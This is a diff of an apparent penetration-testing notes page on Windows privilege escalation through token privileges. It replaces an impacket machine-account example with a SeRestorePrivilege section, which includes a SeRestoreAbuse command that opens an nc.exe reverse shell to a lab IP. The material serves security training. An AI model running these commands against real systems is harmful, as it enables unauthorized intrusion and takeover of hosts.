@@ -152,7 +152,9 @@ PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell I
 
 
 
-## Insecure Privileges
+## Insecure Privileges - Abusing Tokens
+
+{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}
 
 The first thing to do when popping a Windows shell is to check the user privileges.
 
@@ -205,21 +207,12 @@ PS> systeminfo
 
 
 
-### SeMachineAccountPrivilege
+### SeRestorePrivilege
 
-This privilege allows us to create a machine account on the domain ($). We can use this machine account to impersonate another user and request a ticket-granting-ticket (Administrator).
+Run [EnableSeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) and you will have access to C:\Windows\System32. If that doesn't work, sometimes it doesn't we can use [SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse) exploit. We can build it in our devbox.
 
-
-
-#### create new computer account - impacket
-
-```shell-session
-impacket-addcomputer heist.offsec/enox -dc-ip 192.168.191.165 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!' 
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-Password:
-[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
-
+```powershell
+.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe"
 ```
 
 ####
